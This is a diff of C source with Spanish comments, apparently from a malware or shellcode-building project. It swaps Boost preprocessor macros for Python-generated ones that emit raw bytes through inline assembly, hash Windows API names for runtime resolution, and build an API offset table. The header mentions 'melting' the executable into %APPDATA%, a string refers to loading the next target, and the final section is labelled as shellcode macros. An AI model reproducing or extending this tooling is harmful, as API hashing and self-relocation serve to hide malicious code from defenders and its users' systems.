@@ -13,9 +13,7 @@
 **            +Posibilidad de hacer melt con el ejecutable a %APPDATA%
 *###############################################################################*/
 
-#include "preprocessor/for_each_i.hpp"
-#include "preprocessor/fold_left.hpp"
-#include "preprocessor/cat.hpp"
+#include "..\..\kPreprocessor\kPreprocessor.h"
 
 /*###############################################################################
 ** DEBUG:
@@ -137,19 +135,31 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 **    Después de generar el hash lo introduce en el binario.
 **    El tamaño del hash es de 16 bits (1 WORD)
 *###############################################################################*/
-#define HASH_AND_EMIT(SEQ) EMIT_WORD(BOOST_PP_SEQ_FOLD_LEFT(CRYPT_BYTE, 0, SEQ))
-#define CRYPT_BYTE(s, st, x) (((st)^((x)*(x))))
+DEFINE_PYSRC(
+def HASH_AND_EMIT(s):
+    r = 0
+    for x in s:
+        r^=(ord(x)*ord(x))
+    return EMIT_WORD(r)
+)DEFINE_END()
 
 /*###############################################################################
 ** EMIT_* :
 **    Macros que introducen en el binario diferentes datos
 *###############################################################################*/
-#define EMIT_BYTE_ARRAY(SEQ) BOOST_PP_SEQ_FOR_EACH_I(EMIT_BYTE_, 0, SEQ)
-#define EMIT_BYTE_(r, d, i, e) __asm _emit ((e)&0xFF)
-#define EMIT_BYTE(d) EMIT_BYTE_(0, 0, 0, d)
-#define EMIT_WORD(d) EMIT_BYTE(((d) >> 0)) EMIT_BYTE(((d) >> 8))
-#define EMIT_DWORD(d)EMIT_WORD(((d) >> 0)) EMIT_WORD(((d) >> 16))
-
+DEFINE_PYSRC(
+def EMIT_BYTE(e):
+    return "__asm _emit("+str(e&0xFF)+")"
+def EMIT_WORD(e):
+    return EMIT_BYTE(e) + EMIT_BYTE(e>>8)
+def EMIT_DWORD(e):
+    return EMIT_WORD(e) + EMIT_WORD(e>>16)
+def EMIT_ARRAY(a):
+    r = ""
+    for c in a:
+        r+=EMIT_BYTE(c)
+    return r
+)DEFINE_END()
 
 #define STACK_OFFSET 0x40
 /*###############################################################################
@@ -157,22 +167,33 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 **    Macro que genera el offset de la función en el stack de APIs y calcula su
 **    hash.
 *###############################################################################*/
-#define API_DEFINE(name, SEQ)\
-    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)-STACK_OFFSET};\
-    HASH_AND_EMIT(SEQ)
 /*###############################################################################
 ** VAR_DEFINE:
 **    Macro que genera el offset de una variable en el stack de APIs.
 *###############################################################################*/
-#define VAR_DEFINE(name)\
-    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)-STACK_OFFSET};
+DEFINE_PYSRC(
+def API_DEFINE(name):
+    if not hasattr(API_DEFINE, "counter"):
+        API_DEFINE.counter = 0
+    else:
+        API_DEFINE.counter+= 1
+    return ("enum {_%s = %d-STACK_OFFSET};"+HASH_AND_EMIT(name)) % (name, API_DEFINE.counter*4)
+def VAR_DEFINE(name):
+    if not hasattr(API_DEFINE, "counter"):
+        API_DEFINE.counter = 0
+    else:
+        API_DEFINE.counter+= 1
+    return ("enum {_%s = %d-STACK_OFFSET};") % (name, API_DEFINE.counter*4)
+)DEFINE_END()
 
 /*###############################################################################
 ** CALC_STACKSIZE:
 **    Macro que calcula el tamaño del stack de APIs
 *###############################################################################*/
-#define CALC_STACKSIZE()\
-    enum {STACKSIZE = (__COUNTER__*4)+0x40};
+DEFINE_PYSRC(
+def STACKSIZE():
+    return API_DEFINE.counter*4
+)DEFINE_END()
 
 /*###############################################################################
 ** Macros de shellcode:
